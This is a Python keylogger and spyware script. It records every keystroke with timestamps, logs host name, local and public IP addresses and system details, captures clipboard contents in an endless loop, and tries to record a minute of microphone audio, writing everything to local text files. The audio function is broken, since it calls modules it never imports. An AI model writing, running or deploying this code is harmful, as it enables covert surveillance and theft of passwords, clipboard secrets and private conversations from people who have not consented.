import pynput
import datetime
import threading
import socket
import platform
import requests
import pyperclip
from requests import get 
from pynput.keyboard import Key, Listener


def on_press(key):
	keys = []
	keys.append(key)
	current_date_time = datetime.datetime.now()
	write_readable_file(keys, current_date_time)
	write_log_file(keys, current_date_time)
	keys  = []


def write_log_file(keys, current_date_time):
	with open("log.text", "a") as file:
		for key in keys:
			file.write(str(key))
			file.write(str(current_date_time))
			file.write("\n")

def write_readable_file(keys, date_time):
	with open("keys.text", "a") as file:
		for key in keys:
			k = str(key).replace("'","")
			if k.find("space") > 0:
				file.write(" ")
				file.write(str(date_time))
				file.write('\n')
			elif k.find("Key") == -1:
				file.write(k)

def write_machine_info_file():
	with open("mach_info.text", "a") as file:
		file.write("Host name: %s" %socket.gethostname())
		file.write("\n")
		file.write("IP address: %s" %socket.gethostbyname(socket.gethostname()))
		file.write("\n")
		file.write("Processor type: %s" %platform.processor())
		file.write("\n")
		file.write("System type: %s" %platform.system())
		file.write("\n")
		file.write("Machine type: %s" %platform.machine())
		file.write("\n")
		file.write("Machine version: %s" %platform.version())
		file.write("\n")
		file.write("public IP: %s" %get('https://api.ipify.org').text)

def get_clipboard_history():
	clipboard_history = ""
	open("clipboard_hist.text", "w")
	while 1:
		if pyperclip.paste() == clipboard_history:
			print("nothing new")
		else:
			with open("clipboard_hist.text", "a") as file:
				file.write(str(pyperclip.paste()))
				file.write("\n")
			clipboard_history = pyperclip.paste()

def record_sound():
	sample_rate = 44100
	recording_duration = 60
	file_name = "audio.wav"
	print("recording....")
	recording = sd.rec(int(sample_rate * recording_duration), samplerate=sample_rate, channels=2)
	sd.wait()
	open(file_name, "w+")
	write(file_name, sample_rate, recording)
	audio_file = read(file_name)
	with open("sound.text", "w") as file:
		file.write(str(audio_file[1]))

def main():
	machine_info = threading.Thread(target=write_machine_info_file)
	machine_info.start()
	clipboard_history = threading.Thread(target=get_clipboard_history)
	clipboard_history.start()
	sound_recording = threading.Thread(target=record_sound)
	sound_recording.start()
	with Listener(on_press=on_press) as listener:
		listener.join()

if __name__ == '__main__':
	main()